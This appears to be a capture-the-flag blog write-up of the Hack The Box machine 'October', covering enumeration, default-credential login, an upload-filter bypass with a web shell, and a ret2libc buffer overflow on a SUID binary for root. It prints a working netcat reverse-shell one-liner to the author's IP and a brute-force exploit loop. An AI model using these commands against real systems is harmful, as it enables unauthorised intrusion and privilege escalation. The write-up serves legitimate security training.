---
title: "[MEDIUM] HTB-October"
draft: false
tags:
  - htb
  - linux
  - october-cms
  - laravel
  - file-upload
  - lse-sh
  - bufferoverflow
---

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/October.png)

October was a pretty chill box other than the privilege escalation part. Buffer Overflow is disappearing these days and even OSCP has replaced it's buffer overflow content into Active Directory instead. This was my first time doing buffer overflow and it was not easy. 

I first gained access to October CMS backend through the credentials (admin:admin) and from there I spawned a reverse shell by uploading p0wny-shell. For privilege escalation, I ran lse.sh and it found /usr/local/bin/ovrflw which is an uncommon SUID binary. Using /usr/local/bin/ovrflw, buffer overflow was done and it got me a shell as the root.

## Information Gathering
### Rustscan

Rustscan finds SSH and HTTP running on October(target):

```bash
┌──(yoon㉿kali)-[~/Documents/htb/october]
└─$ rustscan --addresses 10.10.10.16 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢
<snip>
Host is up, received syn-ack (0.36s latency).
Scanned at 2024-04-19 00:47:24 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds
```


### Nmap

Nmap finds that **October CMS** is running with **vanilla** theme on HTTP:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/october]
└─$ sudo nmap -sVC -p 22,80 10.10.10.16                                                             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-19 00:48 EDT
Nmap scan report for 10.10.10.16
Host is up (0.34s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: October CMS - Vanilla
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.64 seconds
```

## Enumeration
### HTTP - TCP 80

The website seemes to be default theme page for October CMS's vanilla theme:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image.png)

`/account` page provides feature to sign-in or to register a new user:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-1.png)

I will try registering random user since it provides such feature:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-5.png)

However,it rejects my request saying there is not space left on the device. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-6.png)

There are some hexademical values that is revaled on the error message and it could be some sort of Web Tokens:

```bash
file_put_contents(/var/www/html/cms/storage/framework/cache/15/1e/151e66eba30b599d37437dd3b40c558d): failed to open stream: No space left on device

file_put_contents(/var/www/html/cms/storage/framework/sessions/d9024fedc13b561aacab713c49acfa74c2a6d353): failed to open stream: No space left on device
```

Unfortunately, from some more enumeration, it seems to be just file paths.


`/forum` directory shows bunch of channels but nothing much could be done here:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-2.png)


#### Directory Bruteforce

I wil move on to directory bruteforcing using feroxbuster:

`sudo feroxbuster -u http://10.10.10.16 -n -x php -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-10.png)

Feroxbuster discovers **16** valid paths and several of them looks interesting, such as **backend**.

I can also map the web app using Burp Suite as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-11.png)



Visiting newly discovered path, `/backend/backend/auth/signin`, I see another login page:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-3.png)



Cliking on **Forgot your password?** leads me to `/backend/backend/auth/restore`, and I can verfiy if the user exists or not through the error message as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-4.png)


### Access /backend/cms

I will try bruteforcing valid username through Burp Suite intruder. 

I first intercept the request for restoring password:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-7.png)

I try all the userames from **/usr/share/seclists/Usernames/cirt-default-usernames.txt** and filter out error message(`A user could not be found with a login value of`) using negative search:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-8.png)

It seems like username **Admin** is valid. input 1,2,5,7 are not filtered since it is too short and it pops different error message from other username tries.

Tring again with username **Admin** and random password, it confirms username is valid:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-9.png)

I tried bruteforcing password as well using hydra and I eneded up getting user **Admin** being suspended. I resetted the box and tried several default passwords and it turned out password is same as the username: **admin**

Using the credentials(admin:admin), I now have access to `/backend/cms`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-13.png)

## Shell as www-data

After sign-in, I am given several more features. 

`/backend/backend/users/myaccount` shows the domain name october.htb:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-14.png)



I can upload files through `/backend/cms/media`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-15.png)

### Upload Protection Bypass

Researching a bit about October CMS Media upload, it seems that there is a upload filter that works with black-list method. 

Reading Metasploit module code from [here](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/october_upload_bypass_exec.rb), it creates payload with extension of **php5**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-16.png)

I will upload [p0wny-shell](https://github.com/flozz/p0wny-shell) to it with extension of **php5** and it succsfully uploads:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-17.png)

I can access the php wb shell through `/storage/app/media/p0wny-shell.php5` and it works fine as **www-data**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-18.png)


### Reverse Shell

Running the following command towards my local netcat listener, it spawns a better shell:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 1337 >/tmp/f`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-19.png)

I can improve the shell using python as such:

`python2 -c 'import pty; pty.spawn("/bin/bash")'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-20.png)

## Privesc: www-data to root
### SUID ovrflw Analysis
Running [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) discovers several interesting things.

Uncommon SETUID binary `/usr/local/bin/ovrflw` is found:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-2.png)

`/var/lib/php5` is running on crontab:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-23.png)

I can confirm the SETUID through `ls -al` command and it does have SETUID right:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-24.png)

It seems like `/usr/local/bin/ovrflow` requires string input at the end. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-25.png)

I will base64 encode it and copy & decode it over to my local Kali machine as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-26.png)

Now I have **ovrflw** copy at local machine:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-27.png)

The /proc/sys/kernel/randomize_va_space file in Linux controls the behavior of Address Space Layout Randomization (ASLR) for memory allocations in the kernel. ASLR randomizes the memory layout of processes to make it more difficult for attackers to exploit memory corruption vulnerabilities.

When randomize_va_space is set to 2, the kernel randomizes the base address of each memory segment during process creation, making it more difficult for attackers to predict the layout of memory and execute successful exploits.

`cat /proc/sys/kernel/randomize_va_space`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-29.png)


When you run the ldd command on a binary, it displays the shared libraries (including libc) that the binary is linked against. If the address of the libc library changes each time you run ldd on the binary, it indicates that Address Space Layout Randomization (ASLR) is enabled on your system.


`ldd /usr/local/bin/ovrflw | grep libc`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-30.png)

NX (or DEP - Data Execution Prevention) marks the stack as non-executable, preventing attackers from executing shellcode placed on the stack. "NX enabled" means that the stack is marked as non-executable, enhancing security.

`checksec -file=ovrflw`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-31.png)

After examining the output of **ldd**, it is apparent that the memory addresses primarily fluctate between **0xb7500000** and **0xb76ff000**. This suggests a limited variation of around 512 possibilities with only one byte and one bit changing between addresses. 

### Buffer Overflow

Using gdb, I can find ovrflw offset and can create a loop for it to get a shell as the root:


```bash
while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-34.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/october/image-33.png)

Read about the process in more detail from [0xdf writeup](https://0xdf.gitlab.io/2019/03/26/htb-october.html#privesc-to-root)

## References
- https://github.com/diego-treitos/linux-smart-enumeration
- https://0xdf.gitlab.io/2019/03/26/htb-october.html#privesc-to-root

